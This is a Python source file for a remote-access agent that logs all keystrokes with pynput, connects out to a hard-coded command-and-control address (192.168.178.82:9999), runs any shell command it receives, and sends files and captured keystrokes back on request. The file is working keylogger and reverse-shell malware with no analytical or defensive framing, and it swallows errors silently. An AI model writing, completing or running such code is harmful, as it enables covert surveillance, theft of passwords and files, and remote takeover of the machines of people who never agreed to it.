import socket
import subprocess
import threading

from pynput import keyboard


class Agent:
    def __init__(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port
        self.recorded_keys = ""
        self.keylogger_active = True

    def start_keylogger(self):
        def on_press(key):
            try:
                self.recorded_keys += key.char
            except AttributeError:
                self.recorded_keys += f"[{key.name}]"

        listener = keyboard.Listener(on_press=on_press)
        listener.start()

    def send_file(self, s, filename):
        try:
            with open(filename, "rb") as f:
                s.sendall(b"[STARTFILE]")
                chunk = f.read(1024)
                while chunk:
                    s.sendall(chunk)
                    chunk = f.read(1024)
                s.sendall(b"[ENDFILE]")
        except Exception as e:
            s.sendall(f"[-] Error reading file: {str(e)}".encode())

    def receive_file(self, s, filename):
        try:
            with open(filename, "wb") as f:
                while True:
                    data = s.recv(1024)
                    if b"[ENDFILE]" in data:
                        f.write(data.replace(b"[ENDFILE]", b""))
                        break
                    f.write(data)
        except Exception as e:
            print(f"[-] Error saving file: {e}")

    def connect_to_c2(self):
        s = socket.socket()

        try:
            s.connect((self.server_host, self.server_port))
            self.start_keylogger()  # start keylogger after connection

            while True:
                command = s.recv(1024).decode()

                if command.lower() in ["exit", "quit"]:
                    break

                if command == "getlogs":
                    s.send(self.recorded_keys.encode())
                    with open("keylogs.txt", "w") as f:
                        f.write(self.recorded_keys)
                    self.recorded_keys = ""
                    continue

                if command.startswith("download"):
                    filename = command.split(" ", 1)[1]
                    self.send_file(s, filename)
                    continue

                if command.startswith("upload "):
                    filename = command.split(" ", 1)[1]
                    s.send(b"[READYFORFILE]")  # Handshake: let server know it's ready
                    self.receive_file(s, filename)
                    continue

                output = subprocess.getoutput(command)
                if output == "" or output == " ":
                    output = "[+] Command executed (no output)"
                s.send(output.encode())
        except KeyboardInterrupt:
            s.close()
        except Exception:
            pass
        finally:
            s.close()


if __name__ == "__main__":
    server_host = "192.168.178.82"
    server_port = 9999
    agent = Agent(server_host, server_port)
    agent.connect_to_c2()
